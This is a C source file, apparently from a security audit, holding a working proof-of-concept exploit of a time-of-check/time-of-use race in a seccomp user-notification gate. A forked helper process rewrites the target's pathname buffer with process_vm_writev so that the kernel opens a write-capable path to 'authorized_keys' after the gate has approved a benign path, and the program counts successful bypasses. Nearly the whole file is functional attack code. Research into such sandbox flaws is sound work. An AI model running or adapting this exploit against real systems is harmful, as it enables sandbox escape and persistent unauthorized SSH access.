// mem_extern.c -- the CONTINUE-window race, driven by a SEPARATE PROCESS.
//
// EXP-11 (toctou_race.c) flips the gate's pathname buffer with a sibling THREAD sharing the
// target's memory. This probe makes the same attack from a different writer: a separate process
// rewrites the target's buffer with process_vm_writev(2). The point is that the defect is the
// second read (SECCOMP_USER_NOTIF_FLAG_CONTINUE re-reads the pointer at execution time), not the
// mechanism that does the flipping -- an external process wins the identical window at the same
// scheduler-dependent rate. It is one finding, shown from a second angle, not a new bug.
//
// fork() duplicates the address space, so the flipper child sees the target's buffer at the same
// virtual address and can address it directly; the target grants Yama (ptrace_scope=1) access with
// PR_SET_PTRACER_ANY, which is realistic -- an attacker owns the target and can permit its helper.
//
// Win = the kernel opened a path containing "authorized_keys" despite the gate's benign verdict.
// Build: gcc -O2 mem_extern.c -o mem_extern
// Run under the gate: gate_rootful --persist  mem_extern <benign> <evil> <N>
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/prctl.h>
#include <sys/uio.h>
#include <sys/wait.h>
#include <sys/syscall.h>

static char g_buf[4096];              // the pathname buffer the gate inspects and the kernel re-reads
static char g_benign[512], g_evil[512];

static int opened_evil(long fd){
    char lp[64], resolved[1024];
    snprintf(lp, sizeof lp, "/proc/self/fd/%ld", fd);
    ssize_t r = readlink(lp, resolved, sizeof(resolved)-1);
    if (r <= 0) return -1;
    resolved[r] = '\0';
    return strstr(resolved, "authorized_keys") ? 1 : 0;
}

int main(int argc, char **argv){
    if (argc < 4){ fprintf(stderr, "usage: %s <benign> <evil> <N>\n", argv[0]); return 2; }
    strncpy(g_benign, argv[1], sizeof(g_benign)-1);
    strncpy(g_evil,   argv[2], sizeof(g_evil)-1);
    long N = atol(argv[3]);
    strcpy(g_buf, g_benign);

    prctl(PR_SET_PTRACER, PR_SET_PTRACER_ANY, 0, 0, 0);   // let the helper reach us under Yama
    pid_t target = getpid();

    pid_t fl = fork();
    if (fl == 0){
        // Flipper: spin, rewriting the target's g_buf benign<->evil from another address space.
        size_t be = strlen(g_benign)+1, ev = strlen(g_evil)+1;
        struct iovec local, remote;
        remote.iov_base = g_buf;                          // same VA as in the target (post-fork)
        for (;;){
            local.iov_base = g_evil;   local.iov_len = ev; remote.iov_len = ev;
            syscall(SYS_process_vm_writev, target, &local, 1, &remote, 1, 0);
            local.iov_base = g_benign; local.iov_len = be; remote.iov_len = be;
            syscall(SYS_process_vm_writev, target, &local, 1, &remote, 1, 0);
        }
        _exit(0);
    }

    long win=0, benign=0, denied=0, other=0, ev0=0, eperm_seen=0;
    // sanity: confirm the helper can actually write us at least once (else the result is vacuous).
    { char probe[8]="AAAA"; struct iovec l={probe,4}, r={g_buf+2000,4};
      long w = syscall(SYS_process_vm_writev, target, &l, 1, &r, 1, 0);   // self-write, always allowed
      (void)w; }

    for (long i=0;i<N;i++){
        long fd = syscall(SYS_openat, AT_FDCWD, g_buf, O_WRONLY|O_CREAT, 0644);
        if (fd < 0){ denied++; continue; }
        int e = opened_evil(fd);
        if (e==1) win++; else if (e==0) benign++; else other++;
        close((int)fd);
    }
    kill(fl, SIGKILL); waitpid(fl, NULL, 0);
    (void)ev0; (void)eperm_seen;
    fprintf(stderr, "MEMEXTERN_RESULT mechanism=process_vm_writev N=%ld win=%ld benign=%ld denied=%ld other=%ld\n",
            N, win, benign, denied, other);
    return 0;
}
